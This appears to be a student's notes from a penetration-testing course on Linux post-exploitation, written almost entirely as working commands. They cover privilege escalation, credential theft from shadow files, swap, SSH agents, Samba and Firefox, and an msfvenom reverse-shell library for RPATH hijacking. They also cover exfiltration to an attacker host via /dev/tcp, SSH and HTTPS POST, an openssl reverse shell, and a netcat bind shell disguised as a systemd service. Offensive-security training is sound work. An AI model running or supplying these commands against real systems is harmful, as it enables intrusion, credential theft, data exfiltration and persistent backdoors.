LINUX POST EXPLOITATION

	PRIVILEGE ESCALATION:

		System and Network Information
		
			Hostname

				hostname

			Kernel Version

				uname -a
			
			Operating System

				cat /etc/issue

			IP address

				ifconfig

			Running Processes

				ps auxw

			Network Routes

				route -n (find hidden networks)

			DNS Server

				cat /etc/resolv.conf (Zone Transfer, AD accounts)

			Arp Cache
	
				arp -a

			Current Network Configurations

				netstat -auntp (may be able to sniff traffic, or make other connections)

		User Information

			Current User Permissions

				find / -user username

			UID and GID Information for all users

				for user in $(cat /etc/passwd | cut -fl -d ":"); do id $user; done

			Last Logged on Users

				last -a

			Root Accounts
		
				cat /etc/passwd | cut -f1,3,4, -d":" | grep "0:0" | cut -fl -d":" | awk '{print $1}'
			
			Service Accounts

				cat /etc/passwd

			Home Directories

				ls -als /home/*

		Privileged Access / Cleartext Credentials

				sudo -l

				find / -perm -4000 -type f 2>/dev/null
				
				grep "password" /etc/*.conf 2> /dev/null

				grep -r password /etc/*.conf 2> /dev/null

				cat /etc/shadow

				ls -als /root

				find /* -name *.*history* -print 2> /dev/null (read other users' history files)

				touch /var/www/file (can we write to directories that are configured to serve web pages)

				find /* -name *.*history* -print 2> /dev/null (find dotfiles with "history" in their names)

				cat /var/log/apache/access.log | grep -E "^user|^pass" (get apache access.log file for "user" and "pass" strings

				cat /etc/NetworkManager/system-connections/* | grep -E "^id|^psk" (dump cleartext pre-shared wireless keys from network manager)

		Services

				netstat -auntp (may be able to sniff traffic, or make other connections)

				find /etc/init.d/ ! -uid 0 -type f 2>/dev/null | xargs ls -la (service configurations readable or modifialbe by our current user)

				cat /etc/mysql/my.cnf

				service service_name start/stop (can we start or stop different services)

		Jobs/Tasks

				cat /etc/crontab

				ls -las /etc/cron.*

				find /etc/cron* -type f -perm -o+w -exec ls -la {} \; (any custom jobs configured as root that are world writeable)

		Installed Software Version Information

				dpkg -l

	We can find a lot of this information within the LinEnum tool or LinPeas

			https://github.com/rebootuser/LinEnum

	Netcat File Transfer

		On local Kali Machine 

			nc -w 3 <target_ip> 1234 < LinEnum.sh

		On Target Machine

			nc -lp 1234 > LinEnum.sh

			chmod +x LinEnum.sh
	
			./LinEnum.sh -h (will show help menu)
		
			./LinEnum.sh -k (search for a keyword, such as password)

			
	Gathering Information with Metasploit

		msf> use post/linux/gather/enum_configs
	
			set session and then run
		
		msf> use post/linux/gather/enum_system

	Gaining information with Man

		If the user is allowed to run man we ran run it with a pager, thus allowing us to see files we shouldn't be able to

			sudo man -P "cat /etc/shadow" man

	CHROOT Jail (Rbash shell)

		run the ENV command to confirm we are in an Rbash shell

		If you can run binaries (such as VIM, NMAP, Less and so on) you can break out of the shell with !sh (in nmap remember it is nmap --interactive then !sh)

			vi /tmp/test
			!sh

		We can also use the find command to break out of restricted shells

			find /home/bob -name test -exec /bin/sh \;
	
		Utilizing the python full intergration shell can also break us out

		Using perl

			perl -e 'exec "/bin/sh";'

		We can also break out using SSH as long as we have the credentials

			ssh <user>@<ip address> -t "/bin/sh"

	Using Unshadow

		unshadow <password file> <shadow file> > shadow.john

		john shadow.john --wordlist=<path to wordlist>

	MimiPenguin
		
		https://github.com/huntergregal/mimipenguin.git

		Used to obtain credentials from memory (used like mimikatz for windows, or kiwi)

		Tries to dump cleartext passwords from the following places

			GDM Passwordk (Kali Desktop, Debian Desktop)
			Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)
			VSFTPd (Active FTP Connections)
			Apache2 (Active HTTP Basic Auth Sessions)
			OpenSSH (Active SSH Sessions - Sudo Usage)

		There are 2 different MimiPenguin scripts, a shell and a python script

		Get MimiPenguin on the target machine and then ./mimipenguin

	Pilfering Credentials from Swap Memory

		swapon -s (shows us partitions) (can also use the cat /proc/swaps)
		
		strings (parition location) | grep "password="
	
			strings /dev/sda5 | grep "password="
		
		strings (parition location) | grep "&password="

			strings /dev/sda5 | grep "&password="

	RPATH and RUNPATH Exploits

		First we must determine if a program is utilizing RPATH or RUNPATH

			objdump -x /user/local/bin/program | grep RPATH

			objdump -x /user/local/bin/program | grep RUNPATH

		We will see where the program is pointing, which is usually a directory
	
		The program will look for shared objects (.so) files and run them
		
		This means that we could put a malicious .so file in the path the program is looking and hopefully it will run that program

			msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker ip> LPORT=<listen port> -f elf-so -o program.so

		Now send that payload
		
			python -m SimpleHTTPServer 80

		On target machine

			cd <where .so file should be> && wget http://<attackerIP>/program.so

				cd /tmp/program/libs && wget http://192.168.1.49/program.so

		Now start a listener

			msf> use exploit/multi/handler
			
				set payload linux/x64/shell_reverse_tcp
				set LHOST
				set LPORT
				run -j
		
		Now we can wait for the program to be executed, execute the program ourselves or hopefully, if we are lukcy it is being ran as a cron job with root and we get eleveated premissions and a reverse shell

	Kernel Exploits

		Dirty Cow
		Stack Clash
		DCCP Double-Free Privilege Escalation
		Race Condition Privilege Escalation

		searchsploit "linux kernel debian"

		We can also use linux exploit suggester
			https://github.com/mzet-/linux-exploit-suggester

		perl Linux_Exploit_Suggester.pl -k 2.6.38 (or whatever kernel you find)

		Remember to find the kernel version if you already have a shell

			uname -a

		If it is the UDEV < 1.4.1 - Local Privilege Escalation Exploit there is a video in this section that shows how to run that exploit

		For kernel exploits we usually need to compile them

			gcc --version (make sure gcc is installed)
	
			gcc <exploit.c> -o exploit
			chmod +x exploit
			./exploit (to run)

		If 32 bit and you need to compile

			gcc -m32 <exploit.c> -o exploit

		Metasploit also has plenty of kernel exploits built into it

			The slides talk about exploit/linux/local/udev_netlink
			set session
			run

		Kernelpop
		
			This was new when the course was made, we can download it from the following

			https://github.com/spencerdodd/kernelpop

	Unix Socket Exploitation

		We can try to connect to a docker socket that is running as root as a nonroot user

			docker run -v /etc/shadow:/docker/hashedpasswords -d postgres
			docker exec -ti {CONTAINER_ID} bash
			cat /docker/hashedpasswords > /docker/test.txt
			chmod 777 /docker/test.txt
			cat /docker/test.txt
	

	LATERAL MOVEMENT:

		SSH Hijacking

			ps aux | grep sshd

			grep SSH_AUTH_SOCK /proc/<pid>/environ
			
			SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXX/agent.XXXX ssh-add -l

			ssh remotesystem -l victim

		Stealing SSH Credentials
	
			use sshLooter

				https://github.com/mthbernardes/sshLooter.git

			On target machine
				
				curl http://<yourip:8000/install.sh> | bash

		Samba Secrets to Domain Admin

			When knew samba user is created the information is stored in a secrets.tdb file
		
				/var/lib/samba/private	

			tdbdump /var/lib/samba/private/secrets.tbd
			
			We can then use the information for pass the hash with pth toolkit

				https://github.com/byt3bl33d3r/pth-toolkit

			For information on how to do this

				https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9

		VPNPivot
	
			Used to create a VPN tunnel between attackers and compromised linux hosts that may be behind firewalls or be use NAT
	
				https://github.com/0x36/VPNPivot
		
		Dumping Stored Firefox Credentials

			When firefox is launched it creates a default profile for the user

				/home/user/.mozilla/firefox (there should be a .default with random strings in front of it)
			
			Passwords are stored in the randomly named profile folder called logins.json and can be found with firefox_decrypt.py

				https://github.com/unode/firefox_decrypt

			The above tool only works if the Master Password has not been set


	DATA EXFILTRATION:

		Exfil over TCP Socket with EBCDIC and Base64

			First open a listener on attacker machine

				nc -lvnp 80 > datafolder.tmp

			On target system

				tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic /dev/tcp/<attackerIP>/80	

			Now decode the information on the attacker machine

				dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar

				tar xf datafolder.tar

		Exfil over SSH

			Since SSH is encrypted it is less likely to be caught doing this

				On target system
				
					tar zcf - /tmp/datafolder | ssh root@<attacker_ip> "cd /tmp; tar zxpf -"

				On attacker machine

					the information is ready to view in the tmp/datafolder

			If we want to be really stealthy we can configure ssh to use port 80, incase port 22 is being monitored

		Exfil via POST Request over HTTPS		

			On attacker machine
				
				Make a contact.php file in /tmp/datafolder.base64
	
					<?php file_put_contents('/tmp/datafolder.base64', file_get_contents('php://input')); ?>

			On victim machine

				curl --data "$(tar zcf - /tmp/datafolder | base64)" https://<attacker_ip>/contact.php
			
			On attacker machine

				cat /tmp/datafolder.base64 | base64 -d > datafolder.tar && tar xf datafolder.tar

	MAINTAING ACCESS:

		MKFIFO Named Pipe

			Can be used to bypass different detection systems
		
			on attacker machine generate an SSL certificate

				openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
			
			the above command will create a key.pem and cert.pem file both of which we will need

				openssl s_server -quiet -key key.pem -cert cert.pem -port 443

			On target system create mkfifo

				mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 \
					| openssl s_client -quiet -connect <attacker_ip>:443 /tmp/x; rm /tmp/x

		ICMP Reverse Shell (icmpsh)

			Slides talk about this but do not show anything else, github 
			https://github.com/bdamele/icmpsh

		Other sites
		
			https://highon.coffee/blog/reverse-shell-cheat-sheet/
			http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

		
		Xinetd UDP Portknock Backdoor

			https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56

				Make sure to setup the above properly
			
			On attacker machine

				nc -lvnp 4444

			Now knock on the backdoor that was uploaded to the target system

				hping3 -2 -c 1 <targetIP> -p 65534

		Systemd Netcat Bind Shell

			On target system

				cp /bin/nc /lib/systemd/systemd-service
				
				Now create a file called systemd.service

					[Unit]
					Description = Systemd Service
					After = network.target
					[Service]
					ExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh
					[Install]
					WantedBy = multi-user.target

					systemctl enable systemd.service
					systemctl start systemd.service
			
			On attacker machine

				nc <targetIP> 56825
			
			
			
		